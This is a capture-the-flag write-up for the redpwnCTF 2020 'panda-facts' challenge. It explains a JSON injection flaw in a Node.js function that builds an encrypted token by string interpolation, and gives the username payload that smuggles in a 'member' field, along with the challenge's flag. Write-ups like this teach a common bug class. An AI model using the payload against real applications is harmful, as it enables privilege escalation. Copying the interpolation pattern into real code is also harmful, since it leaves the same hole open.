<h1>panda-facts</h1>

<p>Authors: <a href="https://github.com/roerohan">roerohan</a>, <a href="https://github.com/thebongy">thebongy</a></p>

<p>Maybe we can call this JSON injection?</p>

<h1>Requirements</h1>

<ul>
<li>Basic knowledge of Node.js.</li>
</ul>

<h1>Source</h1>

<ul>
<li><a href="./index.js">index.js</a></li>
<li>https://panda-facts.2020.redpwnc.tf/</li>
</ul>

<h1>Exploitation</h1>

<p>```javascript
async function generateToken(username) {
    const algorithm = 'aes-192-cbc'; 
    const key = Buffer.from(process.env.KEY, 'hex'); 
    // Predictable IV doesn't matter here
    const iv = Buffer.alloc(16, 0);</p>

<pre><code>const cipher = crypto.createCipheriv(algorithm, key, iv);

const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`

let encrypted = '';
encrypted += cipher.update(token, 'utf8', 'base64');
encrypted += cipher.final('base64');
return encrypted;
</code></pre>

<p>}
```</p>

<p>You really just need to notice this function. Notice, the token is not created like <code>token.username = username</code>. It's formed in the following way:</p>

<p><code>
const token = `{"integrity":"${INTEGRITY}","member":0,"username":"${username}"}`
</code></p>

<p>This allows us to close the <code>"</code> with the help of the string we pass, and set member to a non-zero value.
<br /></p>

<p>We can just pass the username as <code>","member":"1</code> and the visit <code>/api/flag</code>.</p>

<p><code>
{
  "success": true,
  "flag": "flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}"
}
</code></p>

<p>The flag is:</p>

<p><code>
flag{1_c4nt_f1nd_4_g00d_p4nd4_pun}
</code></p>
